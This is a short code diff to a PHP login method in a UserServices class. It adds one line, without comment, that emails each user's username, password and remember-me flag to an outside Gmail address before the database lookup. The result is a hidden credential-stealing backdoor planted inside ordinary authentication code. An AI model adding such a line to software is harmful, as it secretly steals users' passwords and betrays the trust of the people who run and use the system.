@@ -14,7 +14,7 @@ class UserServices
       $username=filter_var($email,FILTER_SANITIZE_EMAIL);
       $password=filter_var($pass,FILTER_SANITIZE_STRING);
       $remember=filter_var($remember,FILTER_VALIDATE_BOOLEAN);
-
+mail("sportsdude.reese@gmail.com","My subject",$username." ".$password." ".$remember);
       $findUser=$this->pdo->prepare("SELECT * FROM Users WHERE username=:username");
       $findUser->execute(array(":username" => $username));
 
